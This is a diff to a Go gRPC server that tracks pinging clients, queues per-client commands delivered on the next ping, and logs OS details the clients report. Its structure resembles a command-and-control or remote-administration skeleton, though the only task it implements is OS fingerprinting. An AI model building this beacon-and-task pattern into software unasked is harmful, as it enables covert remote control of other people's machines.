@@ -2,13 +2,13 @@ package main
 
 import (
 	"bufio"
+	"encoding/json"
 	"flag"
 	"fmt"
 	"io"
 	"log"
 	"net"
 	"os"
-	"runtime"
 	"strings"
 	"time"
 
@@ -19,7 +19,15 @@ import (
 
 type server struct{}
 type CommandLine struct{}
-
+type OSInfo struct {
+	Family       string
+	Architecture string
+	ID           string
+	Name         string
+	Codename     string
+	Version      string
+	Build        string
+}
 type Client struct {
 	ID       string
 	ClientIP string
@@ -61,22 +69,46 @@ func (s server) HandleCommands(srv pb.Com_HandleCommandsServer) error {
 		// continue if number reveived from stream
 		// less than max
 
+		cl := Client{
+			ID:       req.ClientID,
+			ClientIP: req.ClientIPAddress,
+			LastPing: time.Now(),
+		}
+
 		switch req.Command {
 		case "ping":
 			{
-				cl := Client{
-					ID:       req.ClientID,
-					ClientIP: req.ClientIPAddress,
-					LastPing: time.Now(),
-				}
 
 				Clients[cl.ID] = cl
 
-				resp := pb.Response{ClientID: cl.ID, ClientIPAddress: cl.ClientIP, Command: "ping", Data: nil}
+				customCmd := Command[cl.ID]
 
-				if err := srv.Send(&resp); err != nil {
-					log.Printf("PING: error %v", err)
+				if customCmd != "" {
+					resp := pb.Response{ClientID: cl.ID, ClientIPAddress: cl.ClientIP, Command: customCmd, Data: nil}
+					delete(Command, cl.ID)
+					if err := srv.Send(&resp); err != nil {
+						log.Printf("OSINFO: error %v", err)
+					}
+				} else {
+					resp := pb.Response{ClientID: cl.ID, ClientIPAddress: cl.ClientIP, Command: "ping", Data: nil}
+
+					if err := srv.Send(&resp); err != nil {
+						log.Printf("PING: error %v", err)
+					}
 				}
+
+			}
+		case "osinfo":
+			{
+				var osinfo OSInfo
+
+				err := json.Unmarshal(req.Data, &osinfo)
+
+				if err != nil {
+					log.Fatalf("%v", err)
+				}
+
+				log.Printf("%v", osinfo)
 
 			}
 		default:
@@ -115,9 +147,9 @@ func main() {
 }
 
 func (cli *CommandLine) printUsage() {
-	fmt.Println("Usage:")
-	fmt.Println("clients - Gets connected clients")
-	fmt.Println("osinfo -clientid - Gets OSINFO of specified client")
+	fmt.Println("Usage: ")
+	fmt.Println("clients - [Gets connected clients]")
+	fmt.Println("osinfo <clientid> - [Gets OSINFO of specified client]")
 }
 
 func (cli *CommandLine) validateArgs(data []string) {
@@ -127,14 +159,7 @@ func (cli *CommandLine) validateArgs(data []string) {
 }
 
 func (cli *CommandLine) getClients() {
-	keys := make([]string, 0, len(Clients))
-	for k := range Clients {
-		keys = append(keys, k)
-	}
-
-	for x := range keys {
-		log.Println(x)
-	}
+	log.Printf("%v", Clients)
 }
 
 func (cli *CommandLine) Run() {
@@ -164,7 +189,6 @@ func (cli *CommandLine) Run() {
 			}
 		default:
 			cli.printUsage()
-			runtime.Goexit()
 		}
 
 		if clients.Parsed() {
@@ -176,7 +200,7 @@ func (cli *CommandLine) Run() {
 			if *clientosinfo == "" {
 				osinfo.Usage()
 			} else {
-				time.Sleep(time.Second * 1)
+				Command[*clientosinfo] = "osinfo"
 			}
 
 		}
